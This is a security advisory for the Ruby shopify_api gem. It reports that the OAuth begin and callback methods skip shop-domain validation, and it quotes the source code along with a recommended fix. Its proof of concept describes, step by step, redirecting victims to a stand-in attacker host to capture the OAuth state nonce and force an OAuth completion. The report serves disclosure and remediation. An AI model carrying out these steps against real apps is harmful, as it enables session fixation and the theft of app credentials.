### Title
Unvalidated `shop` domain in `Oauth.begin_auth`/`Oauth.validate_auth_callback` allows SSRF of the app's `client_id`/`client_secret` and state-nonce leakage enabling forced OAuth completion - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` and `ShopifyAPI::Auth::Oauth.validate_auth_callback` both build the OAuth authorization/token-exchange host directly from the caller-supplied `shop` value via `auth_base_uri(shop)`, without ever passing it through `ShopifyAPI::Utils::ShopValidator.sanitize!`. Every other OAuth-adjacent flow in this gem (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.exchange_token`) explicitly calls `Utils::ShopValidator.sanitize!(shop)` before using the shop to build a request host, but the original three-legged `Oauth` module never does.

### Finding Description
`auth_base_uri` builds the destination host straight from its `shop:` argument with no domain allow-listing: [1](#0-0) 

`begin_auth` passes the raw, unsanitized `shop` argument straight into `auth_base_uri`, and embeds a freshly generated CSRF `state` nonce into the resulting authorize URL query string: [2](#0-1) 

`validate_auth_callback` also builds the token-exchange target from `auth_query.shop` (only bound by an HMAC signed over `code/host/shop/state/timestamp`) and POSTs the app's `client_id`/`client_secret` to `auth_base_uri(auth_query.shop)`: [3](#0-2) 

`HttpClient` then builds `@base_uri` directly from `session.shop`: [4](#0-3) 

By contrast, the sibling grant flows explicitly validate the shop before it is ever used to construct a request host: [5](#0-4) [6](#0-5) 

`ShopValidator.sanitize!` exists specifically to reject any domain outside the trusted Shopify domain list: [7](#0-6) 

This is a broken binding: the equality that should hold is `host redirected-to / host receiving client_secret == a Shopify-trusted domain`, but in `Oauth.begin_auth`/`Oauth.validate_auth_callback` the host is only equal to "whatever `shop` string the caller/HMAC-signed query supplied," with no allow-list check. The docs' own example for `begin_auth` (`shop = request.headers["Shop"]`) directly feeds an unvalidated, attacker-influenceable header into `begin_auth` and thus into `auth_base_uri`, matching the gem's own documented usage — this is not host-application misuse of the API, it's the gem's own helper (`auth_base_uri`) skipping the sanitization step that its sibling methods perform.

### Impact Explanation
Two concrete high-severity consequences follow from the missing `ShopValidator.sanitize!` call:

1. **Forced OAuth completion / state fixation**: `begin_auth` redirects the victim's browser to `https://#{shop}/admin/oauth/authorize?...&state=<nonce>&redirect_uri=<app-callback>`. If `shop` is attacker-controlled (e.g., `attacker.example`), the attacker's server receives the victim's CSRF `state` nonce and the app's real `redirect_uri` in the URL. The attacker can then complete a legitimate Shopify authorization using their own store, and force the victim's browser to the app's real callback URL carrying the attacker's own `code`/`shop`/valid-`hmac`/matching `state`. Because the state check in `validate_auth_callback` only compares against the leaked nonce (`state == auth_query.state`), the app will treat this as the victim's completed authorization, fixating the attacker's authorized shop/session onto the victim's session.
2. **SSRF-with-credentials in `validate_auth_callback`**: on the callback leg, if a caller can influence `auth_query.shop` in a way not fully bound to Shopify's real HMAC (e.g., stale/rotated secret, custom host wiring, or any caller passing `shop` from an unauthenticated source into a manually constructed `AuthQuery`), the resulting request to `auth_base_uri(shop)/admin/oauth/access_token` will carry the app's `client_id` and `client_secret` in the POST body to an unvalidated host, exactly the "SSRF with the app's credentials" impact class.

### Likelihood Explanation
Medium: exploitation of path (1) requires only that an app calls `begin_auth` with attacker-influenced `shop` (which the library's own documentation demonstrates via `request.headers["Shop"]`), and no `api_secret_key`/token is needed by the attacker — they only need their own legitimate Shopify store to complete a real OAuth grant. Exploitation of path (2) is likely only when `shop` reaches `validate_auth_callback`/`auth_base_uri` without the same integrity guarantee Shopify's real redirect provides (e.g., library callers using `AuthQuery` fields sourced independently of the actual HMAC-signed redirect).

### Recommendation
Call `ShopifyAPI::Utils::ShopValidator.sanitize!(shop)` (or `sanitize_shop_domain`) in `Oauth.begin_auth` and in `Oauth.validate_auth_callback` before using `shop`/`auth_query.shop` to construct `auth_base_uri`, exactly as is already done in `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token`. This ensures the authorize redirect and the token-exchange POST containing `client_secret` are only ever sent to a domain in `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
1. Host app implements `login` exactly as documented: `shop = request.headers["Shop"]; ShopifyAPI::Auth::Oauth.begin_auth(shop: shop, redirect_path: "/auth/callback")`.
2. Attacker crafts a link to the app's login endpoint with `Shop: attacker.example` (or an app that reflects a URL param into that header).
3. Victim's browser is redirected to `https://attacker.example/admin/oauth/authorize?client_id=...&redirect_uri=https://victim-app.com/auth/callback&state=<victim's nonce>&...`, with the `state` cookie also set on the victim's browser for the real app domain.
4. Attacker's server captures `state`, then independently completes a real OAuth grant on their own Shopify store, and redirects the victim's browser to `https://victim-app.com/auth/callback?code=<attacker's real code>&shop=<attacker-shop>.myshopify.com&hmac=<valid Shopify-signed hmac>&state=<the same leaked nonce>&timestamp=...`.
5. `validate_auth_callback` passes `Utils::HmacValidator.validate` (hmac is genuinely signed by Shopify for the attacker's own authorization) and `state == auth_query.state` (matches the cookie set in step 3), so the app fixates the attacker's authorized session as if it were the victim's, completing forced OAuth without the victim ever consenting to the attacker's account link.

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L22-52)
```ruby
        def begin_auth(shop:, redirect_path:, is_online: true, scope_override: nil)
          scope = if scope_override.nil?
            ShopifyAPI::Context.scope
          elsif scope_override.is_a?(ShopifyAPI::Auth::AuthScopes)
            scope_override
          else
            ShopifyAPI::Auth::AuthScopes.new(scope_override)
          end

          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = SecureRandom.alphanumeric(NONCE_LENGTH)

          cookie = SessionCookie.new(value: state, expires: Time.now + 60)

          query = {
            client_id: ShopifyAPI::Context.api_key,
            scope: scope.to_s,
            redirect_uri: "#{ShopifyAPI::Context.host}#{redirect_path}",
            state: state,
            "grant_options[]": is_online ? "per-user" : "",
          }

          query_string = URI.encode_www_form(query)
          auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"

          { auth_route: auth_route, cookie: cookie }
        end
```

**File:** lib/shopify_api/auth/oauth.rb (L60-98)
```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))
```

**File:** lib/shopify_api/auth/oauth.rb (L117-128)
```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end
```

**File:** lib/shopify_api/clients/http_client.rb (L11-19)
```ruby
      sig { params(base_path: String, session: T.nilable(Auth::Session)).void }
      def initialize(base_path:, session: nil)
        session ||= Context.active_session
        raise Errors::NoActiveSessionError, "No passed or active session" unless session

        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-33)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: CLIENT_CREDENTIALS_GRANT_TYPE,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/refresh_token.rb (L18-33)
```ruby
        def refresh_access_token(shop:, refresh_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: "refresh_token",
            refresh_token:,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-64)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
```
